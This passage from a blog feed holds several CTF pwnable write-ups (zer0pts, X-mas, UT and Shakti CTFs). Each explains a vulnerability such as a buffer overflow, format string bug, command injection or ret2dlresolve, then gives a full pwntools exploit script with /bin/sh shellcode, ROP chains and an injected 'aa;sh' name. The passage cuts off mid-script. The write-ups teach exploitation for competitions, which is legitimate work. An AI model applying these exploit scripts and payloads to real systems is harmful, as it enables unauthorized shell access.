<p>They gave me source code. So it is easy to find where vulnerability is. Look at the <code>vuln</code> function. when <code>read</code> function is called, a vulnerability occurs. The buffer size is only 0x100. but the size that you can read is 0x1000. It is Buffer Overflow. Then i can overwrite the return address because the stack canary is turned off. and also i can use shellcode. (NX disabled). we can control the rsi by overwritting rbp-0x100. [<code>lea rsi, [rbp-0x100]</code>]. It means that i can arbitrary write.<br>So i changed retrun address to <code>call exit</code>  into the address to call <code>start</code> for triggering bof again. I got many opportunities to trigger bof. I wrote shellcode on the section of <code>0x00600000</code><br><img src="https://user-images.githubusercontent.com/49066484/110239479-687a6c00-7f8a-11eb-8844-89e946b56211.png" alt="bbn"><br>It was <code>rwxp</code> Permission, That’s why i used shellcode and wrote in there. Finally I overwrited return address to shellcode address and got the sh.</p>
<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;pwn.ctf.zer0pts.com&#x27;,9011)</span></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line"><span class="comment">#change rsi (ret addr)</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0x600334</span>) </span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite ret addr.</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x4000c3</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#change rsi for shellcode and write.</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0x600384</span>) </span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#change rsi (ret addr)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;C&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0x600334</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#overwrite ret addr.</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">p.send(p64(<span class="number">0x600284</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Write-up</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwnable</tag>
        <tag>write-up</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 X-mas CTF </title>
    <url>/2020/12/24/2020-12-25-XMAS_CTF_2020/</url>
    <content><![CDATA[<center>2020 X-mas CTF Write-up </center>


<h1 id="Baby-Rudolph-pwnable"><a href="#Baby-Rudolph-pwnable" class="headerlink" title="Baby_Rudolph (pwnable)"></a>Baby_Rudolph (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/110240519-b180ef00-7f8f-11eb-96e2-089f6ad9c54f.png" alt="image"></p>
<p>There is Buffer Overflow in <code>vuln function</code>. It is triggered by calling <code>read</code>.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/110240604-189ea380-7f90-11eb-9a28-53016a34540e.png" alt="image"></p>
<p>And Using <code>get_arm</code> function, we can get the sh. So it is easy bof. just overwrite retur address to <code>get_arm</code>.</p>
<span id="more"></span>
<p><img src="https://user-images.githubusercontent.com/49066484/110240678-6f0be200-7f90-11eb-9e34-da677cef49ef.png" alt="image"></p>
<p>We need ARM, because the binary  is for ARM architecture. So They gave docker. but it didn’t work. I used qemu for constructing  analysis environment.<br><code>/usr/bin/qemu-system-aarch64 -M virt -cpu cortex-a57 -m 128 -kernel ./kernel -initrd ./rootfs -nographic -serial mon:stdio -append console=ttyAMA0</code></p>
<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;host7.dreamhack.games&#x27;</span>,<span class="number">17341</span>)</span><br><span class="line">get_arm = <span class="number">0x400680</span></span><br><span class="line">argv = <span class="number">0x1225</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;\x90&#x27;</span>*<span class="number">72</span></span><br><span class="line">payload += p64(get_arm)</span><br><span class="line">payload += p64(argv)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ARM...!\N&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


<h1 id="Oil-System-pwnable"><a href="#Oil-System-pwnable" class="headerlink" title="Oil_System (pwnable)"></a>Oil_System (pwnable)</h1><h2 id="vulnerability-1"><a href="#vulnerability-1" class="headerlink" title="vulnerability"></a>vulnerability</h2><p>It opens the file with the name I entered. and also it uses <code>System</code> function when it opens the file.<br>(ex Syste(/home/~~))</p>
<p><img src="https://user-images.githubusercontent.com/49066484/110240852-36b8d380-7f91-11eb-8288-3655ddfe0783.png" alt="image"></p>
<p>When i entered the name, It called <code>check_upper_lower</code>function. But it only check whether the first character is lowercase or not. It means the name can contain <code>;</code> or <code>|</code> after first character. So we can use <code>command injection</code>.  if i  enter the name as A;/bin/sh, can get the sh.</p>
<h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./oil&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Name : &#x27;</span> , <span class="string">&#x27;aa;sh&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Code : &#x27;</span>, <span class="string">&#x27;1 2 3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Write-up</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwnable</tag>
        <tag>write-up</tag>
      </tags>
  </entry>
  <entry>
    <title>2021 UT CTF</title>
    <url>/2021/03/12/2021-03-13-UT_CTF_2021/</url>
    <content><![CDATA[<center>2021 UT CTF Write-up </center>


<h1 id="2SMOL-pwnable"><a href="#2SMOL-pwnable" class="headerlink" title="2SMOL (pwnable)"></a>2SMOL (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/111152857-8ff9b600-85d4-11eb-9dbd-86f5679cd799.png" alt="3"></p>
<p>First, Check the protection. All of protection is turned off. </p>
<span id="more"></span>
<p><img src="https://user-images.githubusercontent.com/49066484/111152849-8c662f00-85d4-11eb-8ccb-c393df5329c3.png" alt="1"></p>
<p><img src="https://user-images.githubusercontent.com/49066484/111152852-8e2ff280-85d4-11eb-899a-2cae6da1e8a6.png" alt="2"></p>
<p>It called only <code>read</code>functions. but the size of read is bigger than buffer. It is Buffer OverFlow.<br>And NXbit is turned off, So I can use shellcode to exploit.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/111154625-c59f9e80-85d6-11eb-84fe-5de9baf007c9.png" alt="4"></p>
<p>But we only have 0x8 size to write. It is not enough to write shellcode on the stack, and also even if we can write shellcode on the stack, we can’t leak the stack address. </p>
<p><img src="https://user-images.githubusercontent.com/49066484/111156001-92f6a580-85d8-11eb-8e21-c7cdab70b5a7.png" alt="6"></p>
<p>So we have to write on memory which we know address. It is <code>0x402000</code>. We can change the flow by using <code>leave ret</code> gadgets. then  we can write shellcode on memory. Lastly, overwrite return address to shellcode’s address.</p>
<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.utctf.live&#x27;</span>, <span class="number">9998</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./smol&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./smol&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x402018</span></span><br><span class="line">fakerbp = <span class="number">0x402068</span></span><br><span class="line">syscall = <span class="number">0x40103d</span></span><br><span class="line">before_read = <span class="number">0x401015</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(before_read)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&quot;\x90&quot;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(fakerbp)</span><br><span class="line">payload += p64(before_read)</span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0x402028</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="resolve-pwnable"><a href="#resolve-pwnable" class="headerlink" title="resolve (pwnable)"></a>resolve (pwnable)</h1><h2 id="vulnerability-1"><a href="#vulnerability-1" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/111622144-2aa00200-882c-11eb-83f4-e8f4510ff132.png" alt="1"></p>
<p>First, Check the protection. No canary, No pie and Partial RELRO. It is easy to overwrite stack buffer.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/111622787-ef520300-882c-11eb-82fc-556f204c52f1.png" alt="2"></p>
<p>The main function only call <code>get@plt</code>. It can occur overflow here. But there is no way to leak libc address and also doesn’t have system functions which can call <code>/bin/sh</code> in binary. But the method for exploit can be inferred from the name of the problem. The name is <code>resolve</code>. So i used <code>return-to-dl-resolve</code>. </p>
<p>If you don’t know well about this, Please refer to the reference.</p>
<blockquote>
<p><a href="https://www.lazenca.net/pages/viewpage.action?pageId=19300744">https://www.lazenca.net/pages/viewpage.action?pageId=19300744</a></p>
</blockquote>
<p>Then let’s find gadgets for exploit.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/111624452-0e519480-882f-11eb-99ec-fd5203e6193d.png" alt="3"></p>
<p>There is <code>get</code>function. so i only need to control <code>rdi</code> for calling function. </p>
<p><img src="https://user-images.githubusercontent.com/49066484/111624688-5670b700-882f-11eb-8768-62752ec2dfe5.png" alt="55"></p>
<p>And get section address what i need. like <code>plt</code>, <code>bss</code>, <code>dynsym</code>, <code>dynstr</code>, <code>rela.plt</code>…</p>
<p>Using <code>ROP</code>, make fake structure which is used by <code>lazy binding</code> and write on the memory which i know address. </p>
<p><img src="https://user-images.githubusercontent.com/49066484/111625605-62a94400-8830-11eb-8a6e-86332e5f4ffa.png" alt="66"></p>
<p>In my case, I wrote on 0x404508. The red is fake structure of <strong>Elf64_Rela</strong>. And the orange is about <strong>Elf64_Sym</strong>. The last things are <code>system</code> and <code>/bin/sh</code>. </p>
<p>After making fake structure, The system function is executed by invoking the <code>plt</code>.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/111626406-4fe33f00-8831-11eb-99a7-94710e34cbe0.png" alt="8"></p>
<p>Finally, I can call <code>system(/bin/sh/)</code> </p>
<h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&#x27;pwn.utctf.live&#x27;,5435)</span></span><br><span class="line">p = process(<span class="string">&#x27;./resolve&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./resolve&#x27;</span>)</span><br><span class="line"></span><br><span class="line">prdi = <span class="number">0x004011c3</span></span><br><span class="line">prsi = <span class="number">0x004011c1</span></span><br><span class="line">leave_ret = <span class="number">0x00401158</span></span><br><span class="line">get_got = <span class="number">0x404018</span></span><br><span class="line">get_plt = <span class="number">0x401040</span></span><br><span class="line">get_code = <span class="number">0x040114e</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x404550</span></span><br><span class="line">ret = <span class="number">0x401159</span></span><br><span class="line">addr_code_get = <span class="number">0x0401142</span></span><br><span class="line"></span><br><span class="line">addr_bss = <span class="number">0x404508</span> <span class="comment">#fake_ebp</span></span><br><span class="line">addr_plt = <span class="number">0x401020</span></span><br><span class="line">addr_got_plt = <span class="number">0x404000</span></span><br><span class="line">addr_dynsym = <span class="number">0x4003c0</span></span><br><span class="line">addr_dynstr = <span class="number">0x400420</span></span><br><span class="line">addr_rela_plt = <span class="number">0x4004b8</span></span><br><span class="line">fake_reloc_struct = <span class="number">0x404508</span></span><br><span class="line">fake_r_sym = <span class="number">0x404530</span></span><br><span class="line">fake_str = <span class="number">0x404548</span></span><br><span class="line">offset = <span class="number">0x2ae</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#stage1</span></span><br><span class="line"><span class="comment">#call read again for writting payload2 on .bss</span></span><br><span class="line"><span class="comment">#and call get_plt, trigger resolve</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">16</span></span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(addr_bss)</span><br><span class="line">payload += p64(get_plt)</span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line"><span class="comment">#ret instruction to prevent stack alignment failure in Ubuntu 18.04 or higher</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(addr_plt)</span><br><span class="line">payload += p64(offset)</span><br><span class="line"></span><br><span class="line"><span class="comment">#stage2</span></span><br><span class="line"><span class="comment">#write payload2 on .bss </span></span><br><span class="line">payload1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#fake_reloc_struct</span></span><br><span class="line">payload1 += p64(get_got)</span><br><span class="line">payload1 += p32(<span class="number">0x7</span>)</span><br><span class="line">payload1 += p32(<span class="number">0x2ba</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x0</span>) * <span class="number">3</span></span><br><span class="line"></span><br><span class="line">payload1 += p32(<span class="number">0x4128</span>)</span><br><span class="line">payload1 += p32(<span class="number">0x12</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x0</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x0</span>)</span><br><span class="line">payload1 += <span class="string">&quot;system\x00\x00&quot;</span></span><br><span class="line">payload1 += <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Write-up</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwnable</tag>
        <tag>write-up</tag>
      </tags>
  </entry>
  <entry>
    <title>2021 Shakti CTF</title>
    <url>/2021/04/04/2021-04-03-Shakti_CTF_2021/</url>
    <content><![CDATA[<center>2021 Shakti CTF Write-up </center>

<h1 id="Birdie-pwnable"><a href="#Birdie-pwnable" class="headerlink" title="Birdie (pwnable)"></a>Birdie (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/113524341-004e9280-95e9-11eb-8de8-0d4ad6a23679.png" alt="CTF1"></p>
<p>First, Check the protection. It is easy to find binary address because of NoPIE.</p>
<span id="more"></span>
<p><img src="https://user-images.githubusercontent.com/49066484/113524421-8bc82380-95e9-11eb-86b9-8077212d2a11.png" alt="CTF2"></p>
<p>When i analyzed it on IDA, i found that there are two vulnerabilities. The first one is <code>Format String Bug</code> on line 11. And the other is <code>Buffer Overflow</code> on line 13. </p>
<p><img src="https://user-images.githubusercontent.com/49066484/113524509-17da4b00-95ea-11eb-8226-4d163a6971c1.png" alt="CTF3"></p>
<p>So i could leak canary and libc addr using <code>Format String Bug</code>. And i could get <code>oneshot</code> because i knew the  libc address. </p>
<p>Let’s get the shell.</p>
<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;34.121.211.139&#x27;, 1111)</span></span><br><span class="line">p = process(<span class="string">&#x27;./birdie&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./birdie&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4007e2</span></span><br><span class="line">system = e.got[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">prdi = <span class="number">0x004008f3</span></span><br><span class="line">prsi = <span class="number">0x004008f1</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;name\n&#x27;</span>,<span class="string">&#x27;%15$p::%17$p::&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;::&#x27;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">libc = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;::&#x27;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(canary)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc)</span><br><span class="line"></span><br><span class="line">libcbase = libc - <span class="number">0x21bf7</span></span><br><span class="line">binsh = libcbase + <span class="number">0x1b3e1a</span></span><br><span class="line">oneshot = libcbase + <span class="number">0x4f3d5</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;AAAAAAAA&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">&#x27;BBBBBBBB&#x27;</span></span><br><span class="line">payload += p64(oneshot)</span><br><span class="line">p.sendafter(<span class="string">&#x27;payload\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Signal-dROPper-pwnable"><a href="#Signal-dROPper-pwnable" class="headerlink" title="Signal dROPper (pwnable)"></a>Signal dROPper (pwnable)</h1><h2 id="vulnerability-1"><a href="#vulnerability-1" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/113524624-f7f75700-95ea-11eb-964c-5c42f3c189cd.png" alt="CTF4"></p>
<p>Check the protection. No canary, No pie and Partial RELRO. It is easy to overwrite stack buffer.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/113530052-07cd6600-9600-11eb-8ddf-12609a94aa24.png" alt="CTF5"></p>
<p><code>0x6020c0</code> includes heap address, <code>0x602120</code> includes size of heap. It seems like you can allocate up to 12 buffers but not really. </p>
<p><img src="https://user-images.githubusercontent.com/49066484/113530229-74e0fb80-9600-11eb-8089-315a30970f31.png" alt="CTF6"></p>
<p>If i could overwrite read’s size (0x602120[v4]), the buffer overflow. </p>
<p><img src="https://user-images.githubusercontent.com/49066484/113530470-18321080-9601-11eb-934f-3985f714c59a.png" alt="CTF7"></p>
<p>So i allocated 13 heaps, then i could overwrite the size part (0x602128). lastly i could write on buffer 0x17c16f0 bytes!</p>
<p>It only remain to leak the libc addr and overwrite return address using ROP.</p>
<h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;34.121.211.139&#x27;, 2222)</span></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x6020c0</span></span><br><span class="line">size = <span class="number">0x602120</span></span><br><span class="line"></span><br><span class="line">prdi = <span class="number">0x00400c03</span></span><br><span class="line">prsi = <span class="number">0x00400c01</span></span><br><span class="line">main = <span class="number">0x400b32</span></span><br><span class="line"></span><br><span class="line">put_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vuln</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice &gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;to: &#x27;</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">13</span>):</span><br><span class="line">    vuln()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice &gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;id: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;AAAAAAAA&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(put_got)</span><br><span class="line">payload += p64(put_plt)</span><br><span class="line">payload += p64(<span class="number">0x4008e7</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;comments?\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;comments\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvn(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leak)</span><br><span class="line">libcbase = leak - <span class="number">0x80aa0</span></span><br><span class="line">system = libcbase + <span class="number">0x4f550</span></span><br><span class="line">binsh = libcbase + <span class="number">0x1b3e1a</span></span><br><span class="line">oneshot = libcbase  + <span class="number">0x10a41c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendlineafter(&#x27;Choice &gt; &#x27;,&#x27;3&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;id: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;AAAAAAAA&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(prsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;comments?\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;comments\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Returning-2-pwnable"><a href="#Returning-2-pwnable" class="headerlink" title="Returning-2 (pwnable)"></a>Returning-2 (pwnable)</h1><h2 id="vulnerability-2"><a href="#vulnerability-2" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/113530906-38ae9a80-9602-11eb-8d67-11f5a5b44c67.png" alt="CTF8"></p>
<p>Check Protection,  No canary~</p>
<p><img src="https://user-images.githubusercontent.com/49066484/113530956-61cf2b00-9602-11eb-8bfd-f530d08b7bcf.png" alt="CTF9"></p>
<p>It is Buffer overflow vulnerability. and also i could allocate dynamically on stack using <code>alloca</code> functions. </p>
<p><img src="https://user-images.githubusercontent.com/49066484/113531112-d99d5580-9602-11eb-8442-fb96d5583fc5.png" alt="CTF10"></p>
<p>I could find that i can make buffer address to read  <code>rsp</code>, when  the alloca’s size is <code>-30</code>.<br>Lastly I use ROP to exploit.</p>
<h2 id="exploit-2"><a href="#exploit-2" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line"><span class="comment">#p = remote(&#x27;34.121.211.139&#x27;, 3333)</span></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x601500</span></span><br><span class="line">push_rsp = e.symbols[<span class="string">&#x27;push_rsp&#x27;</span>]</span><br><span class="line">mov = <span class="number">0x0400774</span></span><br><span class="line">prax = <span class="number">0x040079a</span></span><br><span class="line">prdi = <span class="number">0x040077f</span></span><br><span class="line">prsi = <span class="number">0x0400791</span></span><br><span class="line">prdx = <span class="number">0x0400788</span></span><br><span class="line">syscall = <span class="number">0x04007a3</span></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input:&#x27;</span>,<span class="built_in">str</span>(-<span class="number">30</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">24</span></span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(prax)</span><br><span class="line">payload += <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload += p64(mov)</span><br><span class="line">payload += p64(prdx)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(prsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(prax)</span><br><span class="line">payload += p64(<span class="number">59</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;text:&#x27;</span>,payload)</span><br><span 